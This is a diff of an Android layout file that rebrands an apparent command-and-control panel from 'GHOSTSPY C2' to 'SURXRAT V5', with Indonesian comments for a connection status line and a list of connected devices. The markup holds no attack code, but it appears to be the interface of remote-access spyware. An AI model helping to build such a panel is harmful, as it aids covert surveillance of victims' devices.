@@ -6,29 +6,32 @@
     android:background="#0a0a0a"
     android:padding="16dp">
 
+    <!-- Header Glitch -->
     <TextView
         android:id="@+id/headerText"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="👻 GHOSTSPY C2"
+        android:text="👻 SURXRAT V5"
         android:textColor="#00ff41"
-        android:textSize="24sp"
+        android:textSize="26sp"
         android:textStyle="bold"
         android:gravity="center"
         android:shadowColor="#00ff41"
-        android:shadowRadius="8"
-        android:layout_marginBottom="16dp"/>
+        android:shadowRadius="12"
+        android:layout_marginBottom="8dp"/>
 
+    <!-- Status Koneksi -->
     <TextView
         android:id="@+id/statusText"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Menghubungkan..."
+        android:text="⏳ Menghubungkan..."
         android:textColor="#aaaaaa"
-        android:textSize="14sp"
+        android:textSize="13sp"
         android:gravity="center"
-        android:layout_marginBottom="24dp"/>
+        android:layout_marginBottom="16dp"/>
 
+    <!-- Daftar Perangkat -->
     <ScrollView
         android:layout_width="match_parent"
         android:layout_height="0dp"
@@ -41,6 +44,7 @@
             android:orientation="vertical"/>
     </ScrollView>
 
+    <!-- Footer -->
     <TextView
         android:id="@+id/footerText"
         android:layout_width="match_parent"
